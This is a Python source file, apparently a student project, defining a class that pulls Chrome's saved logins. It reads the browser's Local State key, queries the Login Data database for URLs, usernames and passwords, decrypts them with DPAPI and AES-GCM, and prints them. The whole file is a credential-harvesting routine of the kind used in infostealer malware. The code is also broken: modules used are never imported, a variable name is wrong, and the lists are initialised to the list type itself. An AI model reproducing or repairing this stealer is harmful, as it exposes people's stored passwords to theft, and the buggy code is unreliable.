##
## EPITECH PROJECT, 2020
## ChromePasswords
## File description:
## GetChromePasswords
##

import os, json, base64
from Config.Config import GoogleChrome
import sqlite3

class GetChromePasswords(object):
    def __init__(self):
        self._fileName = "Passwords.json"
        self._localStatePath = os.path.expandvars(GoogleChrome.get('LocalState'))
        self._loginDataPath = GoogleChrome.get('env') + GoogleChrome.get('LoginData')
        self._encryptedKey = None
        self._url = list
        self._username = list
        self._password = list
        self._start()
    
    def _getEncryptedKey(self):
        with open(self._localStatePath, 'r') as file:
            self._encryptedKey = json.loads(file.read())['os_crypt']['encrypted_key']
        self._encryptedKey = base64.b64decode(self._encryptedKey)
        self._encryptedKey = self._encryptedKey[5:]

    def _decryptedPasswords(self, query):
        decryptedKey = win32crypt.CryptUnprotectData(encryptedKey, None, None, None, 0)[1]
        data = query[2]
        nonce = data[3:3 + 12]
        ciphertext = data[3 + 12:-16]
        tag = data[-16:]
        cipher = AES.new(decryptedKey, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        password = plaintext.decode("utf-8")
        return password

    def _getInformations(self):
        if not os.path.isfile(self._loginDataPath):
            print("File does not exist")
            return 1
        else:
            connect = sqlite3.connect(self._loginDataPath)
            cursor = connect.cursor()
            try:
                cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            except:
                print("Cannot read file")
                return 1
            for query in cursor.fetchall():
                self._url.append(query[0])
                self._username.append(query[1])
                self._password.append(self._decryptedPasswords(query))
            print(self._url)
            print(self._username)
            print(self._password)

    def _start(self):
        self._getEncryptedKey()
        self._getInformations()